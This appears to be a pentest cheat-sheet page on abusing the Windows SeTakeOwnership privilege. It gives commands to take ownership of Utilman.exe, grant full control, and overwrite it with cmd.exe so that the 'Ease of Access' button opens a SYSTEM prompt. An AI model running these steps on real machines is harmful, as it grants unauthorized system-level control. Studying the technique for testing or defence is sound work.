---
description: >-
  The SeTakeOwnership privilege allows a user to take ownership of any object on
  the system, including files and registry keys, opening up many possibilities
  for an attacker to elevate privileges..
---

# SeTakeOwnership

Assumption: RDP connection.&#x20;

1. Open a command prompt using the "Open as administrator" option.
2. Check the privilege - whoami /priv&#x20;
3. Run the commands.&#x20;

```bash
CMD> takeown /f C:\Windows\System32\Utilman.exe
CMD> icacls C:\Windows\System32\Utilman.exe /grant <username>:F
CMD> copy cmd.exe utilman.exe
```

4. Proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
